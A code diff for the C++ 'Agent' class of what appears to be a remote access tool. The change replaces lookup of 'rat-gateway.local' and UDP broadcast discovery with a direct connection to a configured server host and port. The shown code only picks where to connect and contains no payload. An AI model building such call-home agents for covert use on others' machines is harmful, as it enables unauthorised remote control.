@@ -32,46 +32,10 @@ void Agent::run() {
 }
 
 void Agent::selectConnectionMethod() {
-    const std::string fixedGateway = "rat-gateway.local";
-    const std::string fixedPort = "8080";
-    
-    cout << "[Network] Attempting to connect to fixed gateway: " << fixedGateway << ":" << fixedPort << "\n" << std::flush;
-    
-    if (GatewayDiscovery::canResolveHostname(fixedGateway)) {
-        discoveredHost_ = fixedGateway;
-        discoveredPort_ = fixedPort;
-        cout << "[Network] Using fixed gateway: " << fixedGateway << ":" << fixedPort << "\n" << std::flush;
-        return;
-    } else {
-        cout << "[Network] Cannot resolve " << fixedGateway << ", falling back to UDP discovery...\n" << std::flush;
-    }
-    
-    cout << "[Network] Attempting LAN Discovery (UDP Broadcast)...\n" << std::flush;
-    cout << "[Network] Searching for Gateway on local network (timeout: 2 seconds)...\n" << std::flush;
-    
-    try {
-        auto result = GatewayDiscovery::discoverGateway(2000);
-        
-        if (!result.first.empty()) {
-            discoveredHost_ = result.first;
-            discoveredPort_ = result.second.empty() ? "8080" : result.second;
-            cout << "[Network] Found Gateway on LAN: " << discoveredHost_ << ":" << discoveredPort_ << "\n" << std::flush;
-            cout << "[Network] Using local network connection\n" << std::flush;
-        } else {
-            cout << "[Network] No Gateway found on LAN\n" << std::flush;
-            std::cerr << "[Network] Gateway discovery failed. Make sure Gateway is running on the network.\n" << std::flush;
-            discoveredHost_ = "";
-            discoveredPort_ = "";
-        }
-    } catch (const std::exception& e) {
-        std::cerr << "[Network] Discovery error: " << e.what() << "\n" << std::flush;
-        discoveredHost_ = "";
-        discoveredPort_ = "";
-    } catch (...) {
-        std::cerr << "[Network] Unknown error during Discovery\n" << std::flush;
-        discoveredHost_ = "";
-        discoveredPort_ = "";
-    }
+    // Direct connection to fixed IP - no discovery, no DNS check
+    discoveredHost_ = Config::SERVER_HOST;
+    discoveredPort_ = Config::SERVER_PORT;
+    cout << "[Network] Connecting directly to: " << discoveredHost_ << ":" << discoveredPort_ << "\n" << std::flush;
 }
 
 void Agent::connect() {
